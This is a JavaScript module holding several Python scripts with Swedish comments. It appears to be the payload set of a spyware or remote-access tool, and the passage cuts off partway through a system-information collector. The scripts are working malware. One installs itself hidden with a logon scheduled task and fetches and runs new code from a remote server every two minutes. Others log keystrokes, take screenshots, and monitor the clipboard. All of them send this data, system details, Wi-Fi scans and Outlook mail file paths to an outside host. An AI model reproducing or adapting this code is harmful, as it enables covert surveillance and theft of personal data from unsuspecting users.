
// This file contains the actual script data extracted from instructions.py
// In a production app, this would be fetched from the server

export const INSTRUCTION_CODE = {
  "standard": `# Standard instruktioner - logga tangenttryckningar
import sys
import subprocess
import importlib.util
import hashlib
import threading
import socket
import uuid
import re
import json

# Funktion för att installera paket
def install_package(package):
    if importlib.util.find_spec(package) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Installera nödvändiga paket
install_package("requests")
install_package("pyperclip")

# Försök installera ytterligare paket för insamling av systeminformation
try:
    install_package("psutil")
    install_package("cryptography")
    install_package("wifi")  # För wifi-information
except:
    pass  # Om vi inte kan installera alla paket fortsätter vi ändå

# Importera moduler efter installation
import os
import shutil
import requests
import logging
import time
import pyperclip
import hashlib
import marshal

# Försök importera ytterligare moduler om de är installerade
try:
    import psutil
    import platform
    from cryptography.hazmat.primitives import hashes
    import wifi
except ImportError:
    pass

# Konfigurera loggning
DESKTOP = os.path.join(os.path.expanduser("~"), "Desktop")
LOG_FILE = os.path.join(DESKTOP, "detail.log")
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler(LOG_FILE, mode='a')]
)

# Variabler för installation
d = os.path.join(os.getenv("APPDATA"), ".cache", "ds")
e = os.path.join(d, "note.py")
f = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
current_instruction_hash = ""

# Server konfiguration
SERVER_URL = "https://neea.fun/listener/log_receiver"
TOKEN = "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg=="

# Funktion för att hämta nya instruktioner från servern
def check_for_new_instructions():
    global current_instruction_hash
    
    try:
        # Skapa client_id baserat på användarnamn och datornamn
        username = os.getlogin()
        system = socket.gethostname()
        client_id = re.sub(r'[^a-zA-Z0-9_-]', '_', f"{username}_{system}".lower())
        
        # Hämta instruktioner från servern
        headers = {"Authorization": f"Bearer {TOKEN}"}
        response = requests.get(
            "https://neea.fun/get_instructions", 
            headers=headers, 
            params={"client_id": client_id}
        )
        
        if response.status_code == 200:
            # Beräkna hash för de nya instruktionerna
            new_instruction_data = response.content
            new_instruction_hash = hashlib.md5(new_instruction_data).hexdigest()
            
            # Om hash är olika, uppdatera instruktionerna
            if current_instruction_hash == "":
                # Första körningen, spara bara hash
                current_instruction_hash = new_instruction_hash
                return False
            elif new_instruction_hash != current_instruction_hash:
                logging.info("Nya instruktioner upptäckta, förbereder uppdatering...")
                
                # Avsluta aktuella schemalagda uppgifter
                try:
                    subprocess.run('schtasks /delete /tn "DSTask" /f', shell=True, stderr=subprocess.DEVNULL)
                except:
                    pass
                
                # Deserialisera nya instruktioner
                try:
                    new_code_object = marshal.loads(new_instruction_data)
                    
                    # Spara nya instruktioner till fil
                    update_script = os.path.join(d, "update.py")
                    with open(update_script, "w") as f:
                        f.write(new_code_object)
                    
                    # Starta nya instruktioner och avsluta denna process
                    subprocess.Popen([f, update_script], 
                                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
                    
                    # Avsluta denna process
                    sys.exit(0)
                except Exception as e:
                    logging.error(f"Fel vid uppdatering av instruktioner: {e}")
                    return False
                
                return True
            else:
                # Samma instruktioner, gör ingenting
                return False
    except Exception as e:
        logging.error(f"Fel vid kontroll av nya instruktioner: {e}")
        return False

# Funktion för periodisk kontroll av nya instruktioner
def instruction_update_loop():
    while True:
        try:
            check_for_new_instructions()
            time.sleep(120)  # Kontrollera var 120:e sekund
        except Exception as e:
            logging.error(f"Fel i uppdateringsloopen: {e}")
            time.sleep(120)  # Fortsätt ändå

# Funktion för att schemalägga
def schedule_task():
    h = os.getlogin()
    i = os.path.join(d, "task.bat")
    j = f'@echo off\\ncd /d "{os.path.dirname(f)}"\\nstart "" "{f}" "{e}"\\nexit'
    with open(i, "w") as k:
        k.write(j)
    l = f'schtasks /create /tn DSTask /tr "{i}" /sc ONLOGON /ru {h} /f /rl HIGHEST /delay 0001:00'
    subprocess.run(l, shell=True)

# Funktion för att samla detaljerad systeminformation
def collect_detailed_system_info():
    info = {
        "timestamp": time.time(),
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": platform.system() if 'platform' in sys.modules else "Unknown",
        "os_version": platform.version() if 'platform' in sys.modules else "Unknown",
        "os_release": platform.release() if 'platform' in sys.modules else "Unknown",
        "mac_address": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
        "timezone": time.tzname,
        "local_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    }
    
    # Försök hämta mer detaljerad information om den finns tillgänglig
    try:
        # CPU & Memory info
        if 'psutil' in sys.modules:
            info["cpu_count"] = psutil.cpu_count()
            info["memory_total"] = psutil.virtual_memory().total
            info["memory_available"] = psutil.virtual_memory().available
            
            # Disk information
            disks = []
            for partition in psutil.disk_partitions():
                try:
                    disk_info = {
                        "device": partition.device,
                        "mountpoint": partition.mountpoint,
                        "fstype": partition.fstype
                    }
                    
                    usage = psutil.disk_usage(partition.mountpoint)
                    disk_info["total_size"] = usage.total
                    disk_info["used_size"] = usage.used
                    disk_info["free_size"] = usage.free
                    disk_info["percent_used"] = usage.percent
                    
                    disks.append(disk_info)
                except:
                    pass
            info["disks"] = disks
            
            # Nätverksinformation
            network_info = []
            for interface_name, interface_addresses in psutil.net_if_addrs().items():
                for address in interface_addresses:
                    if address.family == socket.AF_INET:  # IPv4
                        network_info.append({
                            "interface": interface_name,
                            "ip": address.address,
                            "netmask": address.netmask
                        })
            info["network"] = network_info
    except:
        pass
    
    # Försök hämta Wi-Fi information
    try:
        if 'wifi' in sys.modules:
            wifi_info = []
            for cell in wifi.Cell.all('wlan0'):
                wifi_info.append({
                    "ssid": cell.ssid,
                    "signal": cell.signal,
                    "quality": cell.quality,
                    "frequency": cell.frequency,
                    "encrypted": cell.encrypted,
                    "encryption_type": cell.encryption_type if cell.encrypted else None
                })
            info["wifi_networks"] = wifi_info
    except:
        pass
    
    # Försök hämta emailkonfiguration från olika platser
    try:
        # Sök efter outlook/email-konfiguration
        email_paths = [
            os.path.join(os.getenv("APPDATA"), "Microsoft", "Outlook"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Outlook")
        ]
        
        email_files = []
        for path in email_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(".pst") or file.endswith(".ost") or file.endswith(".nk2"):
                            email_files.append(os.path.join(root, file))
        
        info["email_files"] = email_files
    except:
        pass
    
    # Omvandla till JSON och returnera
    return json.dumps(info)

# Funktion för att skicka systeminformation
def send_system_info(info_json):
    headers = {"Authorization": f"Bearer {TOKEN}"}
    payload = {
        "type": "system_info",
        "user": os.getlogin(),
        "system": os.environ.get("COMPUTERNAME", "unknown"),
        "data": info_json
    }
    try:
        requests.post(SERVER_URL, json=payload, headers=headers)
        logging.info("Systeminformation skickad till server")
    except Exception as e:
        logging.error(f"Fel vid sändning av systeminformation: {e}")

# Installera scriptet
if os.path.abspath(__file__) != e:
    os.makedirs(d, exist_ok=True)
    shutil.copy(__file__, e)
    schedule_task()
    subprocess.Popen([f, e], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
    sys.exit(0)

# Skicka detaljerad systeminformation vid första uppstart
detailed_info = collect_detailed_system_info()
send_system_info(detailed_info)

# Starta en separat tråd för kontroll av instruktionsuppdateringar
update_thread = threading.Thread(target=instruction_update_loop, daemon=True)
update_thread.start()

# Funktion för att skicka klippbordsdata
def send_data(data):
    headers = {"Authorization": f"Bearer {TOKEN}"}
    payload = {"type": "clipboard", "user": os.getlogin(), "system": os.environ.get("COMPUTERNAME", "unknown"), "data": data}
    try:
        requests.post(SERVER_URL, json=payload, headers=headers)
    except Exception:
        pass

# Huvudloop - Klippbordsövervakning
last_clipboard = ""
while True:
    try:
        current_clipboard = pyperclip.paste()
        if current_clipboard != last_clipboard and current_clipboard.strip():
            send_data(current_clipboard)
            last_clipboard = current_clipboard
        time.sleep(10)
    except Exception:
        pass`,
  
  "keylogger": `# Instruktion: Keylogger-läge - Registrera och skicka tangenttryckningar
import platform
import getpass
import os
import json
import urllib.parse
import urllib.request
import time
import threading
import base64
import socket
import datetime
import ssl
import importlib
import sys
from io import StringIO

# Grundläggande information
USER = getpass.getuser()
SYSTEM = platform.node()
SERVER_URL = "https://neea.fun/listener/log_receiver"
SECRET_TOKEN = "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg=="
SEND_INTERVAL = 3600

def send_data(data_type, data):
    """Skickar data till servern."""
    try:
        url = SERVER_URL
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {SECRET_TOKEN}"
        }
        
        # Koda data för säker överföring
        encoded_data = urllib.parse.quote(data)
        
        payload = json.dumps({
            "type": data_type,
            "user": USER,
            "system": SYSTEM,
            "data": encoded_data
        })
        
        # Skapa SSL-kontext som ignorerar certifikatfel
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        # Skapa förfrågan
        req = urllib.request.Request(url, data=payload.encode('utf-8'), headers=headers)
        
        # Skicka förfrågan
        with urllib.request.urlopen(req, context=ctx) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Fel vid sändning av data: {str(e)}")
        return None

# Huvudfunktion för tangenttrycksregistrering
def keylogger():
    buffer = StringIO()
    
    # Returnera en funktion som kan anropas från pynput
    def on_press(key):
        try:
            char = key.char
            buffer.write(char)
        except AttributeError:
            # Specialtangenter
            if key == keyboard.Key.space:
                buffer.write(" ")
            elif key == keyboard.Key.enter:
                buffer.write("\\n")
            elif key == keyboard.Key.tab:
                buffer.write("\\t")
            else:
                # Andra specialtangenter
                buffer.write(f"[{str(key)}]")
    
    # Funktion för periodisk sändning
    def send_buffer():
        nonlocal buffer
        while True:
            time.sleep(SEND_INTERVAL)
            content = buffer.getvalue()
            if content:
                send_data("keystrokes", content)
                buffer = StringIO()
    
    # Importera pynput först när programmet körs för att inte orsaka fel vid kompilering
    try:
        global keyboard
        from pynput import keyboard
        
        # Starta sändartråd
        sender_thread = threading.Thread(target=send_buffer, daemon=True)
        sender_thread.start()
        
        # Meddela att en ny klient har anslutit
        send_data("keystrokes", "New client connected")
        
        # Starta tangenttrycksregistrering
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
            
    except ImportError:
        print("Kunde inte importera pynput. Försöker installera...")
        try:
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
            from pynput import keyboard
            print("pynput installerat framgångsrikt.")
            keylogger()  # Starta om keylogger efter installation
        except Exception as e:
            print(f"Kunde inte installera pynput: {e}")
            # Fallback - skicka ett felmeddelande
            send_data("keystrokes", f"Kunde inte starta keylogger: {str(e)}")

# Starta keylogger som huvudfunktion
keylogger()`,
  
  "screenshot": `# Instruktion: Screenshot-läge - Ta och skicka skärmdumpar
import platform
import getpass
import os
import json
import urllib.parse
import urllib.request
import time
import threading
import base64
import socket
import datetime
import ssl
import sys
import importlib

# Grundläggande information
USER = getpass.getuser()
SYSTEM = platform.node()
SERVER_URL = "https://neea.fun/listener/log_receiver"
SECRET_TOKEN = "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg=="
SEND_INTERVAL = 3600

def send_data(data_type, data):
    """Skickar data till servern."""
    try:
        url = SERVER_URL
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {SECRET_TOKEN}"
        }
        
        # Koda data för säker överföring
        encoded_data = urllib.parse.quote(data)
        
        payload = json.dumps({
            "type": data_type,
            "user": USER,
            "system": SYSTEM,
            "data": encoded_data
        })
        
        # Skapa SSL-kontext som ignorerar certifikatfel
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        # Skapa förfrågan
        req = urllib.request.Request(url, data=payload.encode('utf-8'), headers=headers)
        
        # Skicka förfrågan
        with urllib.request.urlopen(req, context=ctx) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Fel vid sändning av data: {str(e)}")
        return None

def take_screenshot():
    """Tar en skärmdump och returnerar den som base64."""
    try:
        # Försök importera PIL för skärmdumpar
        try:
            from PIL import ImageGrab
        except ImportError:
            print("PIL saknas. Försöker installera...")
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "Pillow"])
            from PIL import ImageGrab
        
        # Ta skärmdump
        screenshot = ImageGrab.grab()
        
        # Spara till en temporär fil
        temp_file = os.path.join(os.path.expanduser("~"), ".temp_screenshot.png")
        screenshot.save(temp_file)
        
        # Läs och konvertera till base64
        with open(temp_file, "rb") as image_file:
            base64_image = base64.b64encode(image_file.read()).decode('utf-8')
        
        # Ta bort den temporära filen
        try:
            os.remove(temp_file)
        except:
            pass
            
        return base64_image
    except Exception as e:
        print(f"Fel vid tagning av skärmdump: {e}")
        return None

def screenshot_loop():
    """Tar skärmdumpar med intervall och skickar dem."""
    while True:
        try:
            # Ta skärmdump
            screenshot_data = take_screenshot()
            if screenshot_data:
                # Skicka till servern
                send_data("screenshot", screenshot_data)
                print(f"Skärmdump tagen och skickad: {datetime.datetime.now()}")
        except Exception as e:
            print(f"Fel i screenshot_loop: {e}")
        
        # Vänta nästa intervall
        time.sleep(SEND_INTERVAL)

# Starta skärmdumpsloopen i en separat tråd
screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
screenshot_thread.start()

# Håll programmet körande
try:
    while True:
        time.sleep(60)
except KeyboardInterrupt:
    print("Avbruten av användaren.")`,
  
  "system_info": `# Instruktion: System Info-läge - Samla och skicka systeminformation
import platform
import getpass
import os
import json
import urllib.parse
import urllib.request
import time
import socket
import datetime
import ssl
import uuid
import sys
import re
import subprocess
import threading

# Grundläggande information
USER = getpass.getuser()
SYSTEM = platform.node()
SERVER_URL = "https://neea.fun/listener/log_receiver"
SECRET_TOKEN = "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg=="

def send_data(data_type, data):
    """Skickar data till servern."""
    try:
        url = SERVER_URL
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {SECRET_TOKEN}"
        }
        
        # Koda data för säker överföring
        encoded_data = urllib.parse.quote(data)
        
        payload = json.dumps({
            "type": data_type,
            "user": USER,
            "system": SYSTEM,
            "data": encoded_data
        })
        
        # Skapa SSL-kontext som ignorerar certifikatfel
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        # Skapa förfrågan
        req = urllib.request.Request(url, data=payload.encode('utf-8'), headers=headers)
        
        # Skicka förfrågan
        with urllib.request.urlopen(req, context=ctx) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Fel vid sändning av data: {str(e)}")
        return None

def get_timezone():
    """Hämtar tidszonen."""
    try:
        return time.tzname[0]
    except:
        return "Okänd"

def get_mac_address():
    """Hämtar MAC-adressen."""
    try:
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return mac
    except:
        return "00:00:00:00:00:00"

def get_public_ip():
    """Hämtar offentlig IP-adress."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen("https://api.ipify.org", context=ctx) as response:
            return response.read().decode('utf-8')
    except:
        return "Okänd"

def get_installed_programs():
    """Hämtar installerade program."""
    installed_programs = []
    
    try:
        if platform.system() == "Windows":
            # För Windows
            import winreg
            registry_paths = [
                r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                r"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
            ]
            
            for reg_path in registry_paths:
                try:
                    registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                    for i in range(0, winreg.QueryInfoKey(registry_key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(registry_key, i)
                            subkey = winreg.OpenKey(registry_key, subkey_name)
                            try:
                                display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                try:
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                except:
                                    version = "Okänd"
                                installed_programs.append({"name": display_name, "version": version})
                            except:
                                pass
                        except:
                            continue
                except:
                    continue
                    
        elif platform.system() == "Linux":
            # För Debian-baserade Linux
            try:
                dpkg_output = subprocess.check_output(["dpkg", "-l"]).decode("utf-8")
                for line in dpkg_output.split("\\n")[5:]:  # Hoppa över rubrikrader
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 3:
                            name = parts[1]
                            version = parts[2]
                            installed_programs.append({"name": name, "version": version})
            except:
                pass
                
            # För RPM-baserade Linux
            try:
                rpm_output = subprocess.check_output(["rpm", "-qa", "--queryformat", "%{NAME} %{VERSION}\\n"]).decode("utf-8")
                for line in rpm_output.split("\\n"):
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 2:
                            name = parts[0]
                            version = parts[1]
                            installed_programs.append({"name": name, "version": version})
            except:
                pass
                
        elif platform.system() == "Darwin":  # macOS
            try:
                apps_dir = "/Applications"
                for app in os.listdir(apps_dir):
                    if app.endswith(".app"):
                        name = app.replace(".app", "")
                        plist_path = os.path.join(apps_dir, app, "Contents", "Info.plist")
                        if os.path.exists(plist_path):
                            try:
                                version_output = subprocess.check_output(["defaults", "read", plist_path, "CFBundleShortVersionString"]).decode("utf-8").strip()
                                installed_programs.append({"name": name, "version": version_output})
                            except:
                                installed_programs.append({"name": name, "version": "Okänd"})
                        else:
                            installed_programs.append({"name": name, "version": "Okänd"})
            except:
                pass
                
    except Exception as e:
        print(f"Fel vid hämtning av installerade program: {e}")
        
    # Begränsa listan till max 100 program
    return installed_programs[:100]

def get_network_interfaces():
    """Hämtar nätverksgränssnitt."""
    interfaces = []
    try:
        if platform.system() == "Windows":
            # För Windows
            ipconfig_output = subprocess.check_output("ipconfig /all", shell=True).decode("utf-8", errors="ignore")
            current_interface = None
            for line in ipconfig_output.split("\\n"):
                if "adapter" in line.lower() and ":" in line:
                    current_interface = line.split(":")[0].strip()
                if "IPv4 Address" in line and current_interface:
                    ip = line.split(":")[1].strip()
                    # Hitta nätmasken
                    netmask = "255.255.255.0"  # Standard
                    for netmask_line in ipconfig_output.split("\\n"):
                        if "Subnet Mask" in netmask_line:
                            netmask = netmask_line.split(":")[1].strip()
                            break
                    interfaces.append({
                        "interface": current_interface,
                        "ip": ip,
                        "netmask": netmask
                    })
                    
        elif platform.system() in ["Linux", "Darwin"]:
            # För Linux och macOS
            ifconfig_output = subprocess.check_output("ifconfig", shell=True).decode("utf-8", errors="ignore")
            current_interface = None
            for line in ifconfig_output.split("\\n"):
                if line and not line.startswith(" ") and ":" in line:
                    current_interface = line.split(":")[0].strip()
                if "inet " in line and current_interface and "127.0.0.1" not in line:
                    parts = line.strip().split()
                    ip = None
                    netmask = None
                    for i, part in enumerate(parts):
                        if part == "inet":
                            ip = parts[i+1].split("/")[0]
                        if part == "netmask":
                            netmask = parts[i+1]
                    if ip:
                        interfaces.append({
                            "interface": current_interface,
                            "ip": ip,
                            "netmask": netmask or "255.255.255.0"
                        })
    except Exception as e:
        print(f"Fel vid hämtning av nätverksgränssnitt: {e}")
        
    return interfaces

def get_wifi_networks():
    """Hämtar tillgängliga WiFi-nätverk."""
    wifi_networks = []
    try:
        if platform.system() == "Windows":
            netsh_output = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True).decode("utf-8", errors="ignore")
            sections = netsh_output.split("SSID")
            for section in sections[1:]:
                try:
                    lines = section.split("\\n")
                    ssid = lines[0].split(" : ")[1].strip() if " : " in lines[0] else "Okänd"
                    signal = None
                    encrypted = False
                    encryption = "Ingen"
                    
                    for line in lines:
                        if "Signal" in line and ":" in line:
                            signal = line.split(":")[1].strip()
                        if "Authentication" in line and ":" in line:
                            auth = line.split(":")[1].strip()
                            if auth.lower() != "open":
                                encrypted = True
                                encryption = auth
                    
                    quality = "Okänd" if not signal else signal
                    
                    wifi_networks.append({
                        "ssid": ssid,
                        "signal": signal or "Okänd",
                        "quality": quality,
                        "encrypted": encrypted,
                        "encryption": encryption
                    })
                except:
                    continue
                    
        elif platform.system() == "Linux":
            try:
                nmcli_output = subprocess.check_output("nmcli -f SSID,SIGNAL,SECURITY device wifi list", shell=True).decode("utf-8", errors="ignore")
                lines = nmcli_output.split("\\n")[1:]  # Skippa rubrikraden
                for line in lines:
                    if line.strip():
                        parts = re.split(r'\\s{2,}', line.strip())
                        if len(parts) >= 3:
                            ssid = parts[0]
                            signal = parts[1]
                            security = parts[2]
                            
                            wifi_networks.append({
                                "ssid": ssid,
                                "signal": signal,
                                "quality": f"{signal}%",
                                "encrypted": security != "--",
                                "encryption": security if security != "--" else "Ingen"
                            })
            except:
                # Försök med iwlist
                try:
                    iwlist_output = subprocess.check_output("sudo iwlist wlan0 scan", shell=True).decode("utf-8", errors="ignore")
                    cells = iwlist_output.split("Cell ")
                    for cell in cells[1:]:
                        try:
                            ssid_match = re.search(r'ESSID:"([^"]*)"', cell)
                            ssid = ssid_match.group(1) if ssid_match else "Okänd"
                            
                            quality_match = re.search(r'Quality=(\d+/\d+)', cell)
                            quality = quality_match.group(1) if quality_match else "Okänd"
                            
                            signal_match = re.search(r'Signal level=(-?\d+) dBm', cell)
                            signal = signal_match.group(1) if signal_match else "Okänd"
                            
                            encrypted = "Encryption key:on" in cell
                            encryption = "WPA2" if "WPA2" in cell else "WPA" if "WPA" in cell else "WEP" if "WEP" in cell else "Ingen"
                            
                            wifi_networks.append({
                                "ssid": ssid,
                                "signal": signal,
                                "quality": quality,
                                "encrypted": encrypted,
                                "encryption": encryption
                            })
                        except:
                            continue
                except:
                    pass
                    
        elif platform.system() == "Darwin":  # macOS
            try:
                airport_output = subprocess.check_output("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s", shell=True).decode("utf-8", errors="ignore")
                lines = airport_output.split("\\n")[1:]  # Skippa rubrikraden
                for line in lines:
                    if line.strip():
                        parts = re.split(r'\\s+', line.strip())
                        if len(parts) >= 5:
                            ssid = parts[0]
                            signal = parts[2]
                            security = ' '.join(parts[6:])
                            
                            wifi_networks.append({
                                "ssid": ssid,
                                "signal": signal,
                                "quality": f"{int(signal) + 100}%",  # Omvandla dBm till kvalitet
                                "encrypted": security != "NONE",
                                "encryption": security if security != "NONE" else "Ingen"
                            })
            except:
                pass
                
    except Exception as e:
        print(f"Fel vid hämtning av WiFi-nätverk: {e}")
        
    return wifi_networks[:20]  # Begränsa till 20 nätverk

def get_disk_info():
    """Hämtar diskinformation."""
    disks = []
    try:
        if platform.system() == "Windows":
            import ctypes
            
            # Hämta alla enheter
            drives = []
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in range(65, 91):  # A-Z
                if bitmask & 1:
                    drives.append(chr(letter) + ":")
                bitmask >>= 1
                
            for drive in drives:
                try:
                    # Kontrollera om enheten är redo (skippa CD/DVD utan skiva)
                    if ctypes.windll.kernel32.GetDriveTypeW(drive + "\\") > 1:
                        # Hämta ledigt utrymme
                        free_bytes = ctypes.c_ulonglong(0)
                        total_bytes = ctypes.c_ulonglong(0)
                        avail_bytes = ctypes.c_ulonglong(0)
                        
                        ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                            ctypes.c_wchar_p(drive + "\\"),
                            ctypes.byref(free_bytes),
                            ctypes.byref(total_bytes),
                            ctypes.byref(avail_bytes)
                        )
                        
                        total = total_bytes.value
                        free = free_bytes.value
                        used = total - free
                        
                        # Skydda mot division med noll
                        if total > 0:
                            percent = round((used / total) * 100)
                        else:
                            percent = 0
                            
                        disks.append({
                            "device": drive,
                            "mountpoint": drive + "\\\\",
                            "fstype": "NTFS",  # Standardvärde, skulle kunna förbättras
                            "total": str(round(total / (1024 * 1024 * 1024), 2)) + " GB",
                            "used": str(round(used / (1024 * 1024 * 1024), 2)) + " GB",
                            "free": str(round(free / (1024 * 1024 * 1024), 2)) + " GB",
                            "percent": percent
                        })
                except:
                    continue
                    
        elif platform.system() in ["Linux", "Darwin"]:
            df_output = subprocess.check_output("df -h", shell=True).decode("utf-8", errors="ignore")
            lines = df_output.split("\\n")[1:]  # Skippa rubrikraden
            for line in lines:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 6:
                        device = parts[0]
                        total = parts[1]
                        used = parts[2]
                        free = parts[3]
                        percent = int(parts[4].replace("%", ""))
                        mountpoint = parts[5]
                        
                        # Försök hämta filsystemtyp
                        fstype = "Okänd"
                        try:
                            if platform.system() == "Linux":
                                fstype_output = subprocess.check_output(f"findmnt -n -o FSTYPE {mountpoint}", shell=True).decode("utf-8").strip()
                                if fstype_output:
                                    fstype = fstype_output
                            elif platform.system() == "Darwin":
                                fstype_output = subprocess.check_output(f"mount | grep {device}", shell=True).decode("utf-8")
                                fstype_match = re.search(r'\\(([^,]+)', fstype_output)
                                if fstype_match:
                                    fstype = fstype_match.group(1)
                        except:
                            pass
                            
                        disks.append({
                            "device": device,
                            "mountpoint": mountpoint,
                            "fstype": fstype,
                            "total": total,
                            "used": used,
                            "free": free,
                            "percent": percent
                        })
                        
    except Exception as e:
        print(f"Fel vid hämtning av diskinformation: {e}")
        
    return disks

def get_cpu_info():
    """Hämtar CPU-information."""
    cpu_name = "Okänd CPU"
    cpu_cores = 0
    
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")
            cpu_name = winreg.QueryValueEx(key, "ProcessorNameString")[0]
            # Räkna kärnor
            cpu_cores = os.cpu_count() or 0
            
        elif platform.system() == "Linux":
            try:
                with open("/proc/cpuinfo", "r") as f:
                    cpuinfo = f.read()
                # Hitta modellnamn
                model_name = re.search(r"model name\\s+:\\s+(.*)", cpuinfo)
                if model_name:
                    cpu_name = model_name.group(1)
                # Räkna kärnor
                cpu_cores = len(re.findall(r"processor\\s+:", cpuinfo))
            except:
                # Försök med lscpu
                try:
                    lscpu_output = subprocess.check_output("lscpu", shell=True).decode("utf-8")
                    model_name = re.search(r"Model name:\\s+(.*)", lscpu_output)
                    if model_name:
                        cpu_name = model_name.group(1)
                    cores = re.search(r"CPU\\(s\\):\\s+(\\d+)", lscpu_output)
                    if cores:
                        cpu_cores = int(cores.group(1))
                except:
                    pass
                    
        elif platform.system() == "Darwin":  # macOS
            try:
                cpu_name = subprocess.check_output("sysctl -n machdep.cpu.brand_string", shell=True).decode("utf-8").strip()
                cpu_cores = int(subprocess.check_output("sysctl -n hw.ncpu", shell=True).decode("utf-8"))
            except:
                pass
                
    except Exception as e:
        print(f"Fel vid hämtning av CPU-information: {e}")
        
    # Standardvärden om inget kunde hämtas
    if not cpu_name or cpu_name == "Okänd CPU":
        cpu_name = platform.processor() or "Okänd CPU"
    if cpu_cores <= 0:
        cpu_cores = os.cpu_count() or 1
        
    return cpu_name, cpu_cores

def get_ram_info():
    """Hämtar RAM-information."""
    total_ram = "Okänd"
    available_ram = "Okänd"
    
    try:
        if platform.system() == "Windows":
            import ctypes
            kernel32 = ctypes.windll.kernel32
            
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]
                
            memoryStatus = MEMORYSTATUSEX()
            memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
            
            total_ram = f"{memoryStatus.ullTotalPhys / (1024**3):.2f} GB"
            available_ram = f"{memoryStatus.ullAvailPhys / (1024**3):.2f} GB"
            
        elif platform.system() == "Linux":
            try:
                with open("/proc/meminfo", "r") as f:
                    meminfo = f.read()
                
                total_match = re.search(r"MemTotal:\\s+(\\d+)", meminfo)
                if total_match:
                    total_kb = int(total_match.group(1))
                    total_ram = f"{total_kb / (1024**2):.2f} GB"
                
                available_match = re.search(r"MemAvailable:\\s+(\\d+)", meminfo)
                if available_match:
                    available_kb = int(available_match.group(1))
                    available_ram = f"{available_kb / (1024**2):.2f} GB"
            except:
                pass
                
        elif platform.system() == "Darwin":  # macOS
            try:
                total_output = subprocess.check_output("sysctl -n hw.memsize", shell=True).decode("utf-8").strip()
                total_bytes = int(total_output)
                total_ram = f"{total_bytes / (1024**3):.2f} GB"
                
                vm_stat_output = subprocess.check_output("vm_stat", shell=True).decode("utf-8")
                page_size_match = re.search(r"page size of (\\d+) bytes", vm_stat_output)
                free_pages_match = re.search(r"Pages free:\\s+(\\d+)", vm_stat_output)
                
                if page_size_match and free_pages_match:
                    page_size = int(page_size_match.group(1))
                    free_pages = int(free_pages_match.group(1))
                    available_bytes = page_size * free_pages
                    available_ram = f"{available_bytes / (1024**3):.2f} GB"
            except:
                pass
                
    except Exception as e:
        print(f"Fel vid hämtning av RAM-information: {e}")
        
    return total_ram, available_ram

def find_email_files():
    """Hittar Outlook och andra e-postfiler på datorn."""
    email_files = []
    
    try:
        if platform.system() == "Windows":
            outlook_paths = [
                os.path.join(os.environ.get('USERPROFILE', ''), 'Documents', 'Outlook Files'),
